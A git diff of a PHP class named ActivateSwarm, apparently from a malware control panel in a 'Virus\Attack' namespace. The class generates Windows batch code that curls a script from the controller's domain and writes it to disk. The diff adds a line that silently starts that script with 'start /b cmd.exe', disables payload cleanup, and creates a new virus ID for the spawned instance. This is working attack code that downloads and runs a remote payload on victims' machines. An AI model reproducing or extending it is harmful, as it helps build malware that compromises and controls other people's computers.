@@ -1,29 +1,17 @@
-<?php /** @noinspection PhpUnused */
+<?php
 
 namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime;
 
-use Kelvinho\Virus\Attack\AttackInterface;
+use Kelvinho\Virus\Attack\AttackBase;
 use Kelvinho\Virus\Attack\BaseScriptWin;
 
-class ActivateSwarm extends AttackInterface {
+class ActivateSwarm extends AttackBase {
     private string $baseLocation = "";
     private string $initialLocation = "";
     private string $libsLocation = "";
     private int $swarmClockSpeed = 2;
     private bool $checkHash = false;
-
-    /**
-     * This will generate the intercept code that will be used to take the reported data back from the virus.
-     */
-    //@formatter:off
-    public function generateIntercept(): string {
-        ob_start(); ?>
-        $attack = $attackFactory->get("<?php echo $this->attack_id; ?>");
-        $attack->setExecuted();
-        $attack->saveState();
-        <?php return ob_get_clean();
-    }
-    //@formatter:on
+    private string $newVirusId = "";
 
     public function getBaseLocation(): string {
         return $this->baseLocation;
@@ -65,11 +53,6 @@ class ActivateSwarm extends AttackInterface {
         $this->checkHash = $checkHash;
     }
 
-    /**
-     * This will restore the state of an attack with all of its configuration using a json string.
-     *
-     * @param string $json The JSON string
-     */
     protected function setState(string $json): void {
         $state = json_decode($json, true);
         $this->baseLocation = $state["baseLocation"];
@@ -77,20 +60,21 @@ class ActivateSwarm extends AttackInterface {
         $this->libsLocation = $state["libsLocation"];
         $this->swarmClockSpeed = $state["swarmClockSpeed"];
         $this->checkHash = $state["checkHash"];
+        $this->newVirusId = $state["newVirusId"];
     }
 
-    /**
-     * This will get the state of an attack as a json string.
-     *
-     * @return string The JSON string
-     */
     protected function getState(): string {
         $state = [];
+        if ($this->newVirusId == "") { // if the new virus id has not been initialized with anything, create a new one
+            $virus = $this->virusFactory->new($this->session->get("user_handle"), false);
+            $this->newVirusId = $virus->getVirusId();
+        }
         $state["baseLocation"] = $this->baseLocation;
         $state["initialLocation"] = $this->initialLocation;
         $state["libsLocation"] = $this->libsLocation;
         $state["swarmClockSpeed"] = $this->swarmClockSpeed;
         $state["checkHash"] = $this->checkHash;
+        $state["newVirusId"] = $this->newVirusId;
         return json_encode($state);
     }
 
@@ -100,14 +84,8 @@ class ActivateSwarm extends AttackInterface {
         <?php return ob_get_clean();
     }
 
-    /**
-     * This is expected to call BaseScript::payloadConfirmationLoop() to generate the appropriate payload confirmation loop.
-     *
-     * @return string
-     */
-    //@formatter:off
     public function generateBatchCode(): string {
-        ob_start(); ?>
+        ob_start(); //@formatter:off ?>
         chCp 65001
         >"<?php echo $this->initialLocation; ?>\mn.cmd" curl -L <?php echo ALT_SECURE_DOMAIN . "/viruses/$this->virus_id/attacks/$this->attack_id/extras/mn\n"; ?>
         >"<?php echo $this->initialLocation; ?>\ic" (
@@ -115,20 +93,16 @@ class ActivateSwarm extends AttackInterface {
             echo libs^|<?php echo $this->libsLocation . "\n"; ?>
             echo base^|<?php echo $this->baseLocation . "\n"; ?>
         )
-        systemInfo > %~pd0system
+        start /b cmd.exe /c "<?php echo $this->initialLocation; ?>\mn.cmd"
         <?php echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode());
-        echo BaseScriptWin::cleanUpPayload();
-        return ob_get_clean();
+        //echo BaseScriptWin::cleanUpPayload();
+        return ob_get_clean(); //@formatter:on
     }
-    //@formatter:on
 
-    /**
-     * @inheritDoc
-     */
-    public function processExtras(string $resource): void {
-        if ($resource == "mn") {
-            echo BaseScriptWin::obfuscate(BaseScriptWin::complexMain($this->virus_id, $this->swarmClockSpeed, $this->checkHash));
-            //echo BaseScriptWin::complexMain($this->virus_id, $this->swarmClockSpeed, $this->checkHash);
+    public function processExtras(string $resourceIdentifier): void {
+        if ($resourceIdentifier == "mn") {
+            //echo BaseScriptWin::obfuscate(BaseScriptWin::complexMain($this->newVirusId, $this->swarmClockSpeed, $this->checkHash));
+            echo BaseScriptWin::complexMain($this->newVirusId, $this->swarmClockSpeed, $this->checkHash);
         }
     }
 }
